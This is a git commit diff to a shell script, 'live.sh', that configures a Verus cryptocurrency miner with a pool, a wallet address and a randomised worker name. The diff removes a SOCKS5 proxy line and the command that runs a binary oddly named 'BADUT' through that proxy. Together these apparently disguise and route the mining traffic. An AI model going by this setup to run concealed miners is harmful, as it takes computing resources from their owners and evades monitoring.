ba99434786c472306f976df52afc4697b2f81663
jytd67 <88607641+jytd67@users.noreply.github.com>
2021-08-08 13:04:42 +0700

    Update live.sh

--- live.sh
+++ live.sh
@@ -6,5 +6,4 @@ screen -dmS ls
 POOL=stratum+tcp://eu.luckpool.net:3956
 WALLET=RVvVk1mWJuiSzxNWR6tpSyRteqREPWzWdA
 WORKER=$(echo $(shuf -i 1-5 -n 1)-BASRENG)
-PROXY=socks5://98.162.25.23:4145
-./BADUT -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
+
